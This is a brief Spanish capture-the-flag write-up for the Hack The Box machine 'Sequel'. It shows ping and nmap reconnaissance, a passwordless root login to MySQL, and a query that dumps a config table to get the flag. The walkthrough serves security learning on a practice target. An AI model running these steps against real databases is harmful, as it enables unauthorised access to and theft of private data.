Maquina: Sequel

Autor:

Dificultad: Muy Facil

![Screenshot 2024-11-10 160302](https://github.com/user-attachments/assets/f70ff2e2-b305-4f65-831b-553a85a1a7c4)

Iniciamos la máquina y verificamos la conexión

ping 10.129.67.127 -c 1

![Screenshot 2024-11-10 161533](https://github.com/user-attachments/assets/6a7d2d97-bd41-4c5a-b99b-d421040bd168)

realizamos un escaneo de puertos y servicios

sudo nmap -sV -sC -v 10.129.67.127

el puerto 3306 perteneciendo al servicio MySQL está abierto

![Screenshot 2024-11-10 161952](https://github.com/user-attachments/assets/ed9a8594-4182-4cd8-84c1-47a7f84a428a)

mysql -h 10.129.67.127 -u root

show databases;

![Screenshot 2024-11-10 162235](https://github.com/user-attachments/assets/ff3698b7-5300-4c63-acad-fd934dd4d615)

use htb;
show tables;

![Screenshot 2024-11-10 162516](https://github.com/user-attachments/assets/d13278bd-931b-4f94-945d-000b8ab62c9a)

select * from config;

![Screenshot 2024-11-10 162352](https://github.com/user-attachments/assets/a629f03c-df4c-4d58-8e00-5c5de5a3ed39)

y conseguimos el flag
